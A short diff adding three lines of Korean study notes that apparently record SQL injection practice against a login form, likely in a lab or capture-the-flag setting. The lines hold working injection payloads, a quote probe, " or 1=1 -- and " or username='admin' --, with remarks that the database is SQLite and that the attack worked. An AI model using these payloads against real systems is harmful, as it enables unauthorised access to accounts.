@@ -1,0 +1,3 @@
+" => SQLite인거 확인
+" or 1=1 -- => 너무 많은 값 나와서 에러 즉, 공격 성공
+" or username='admin' --
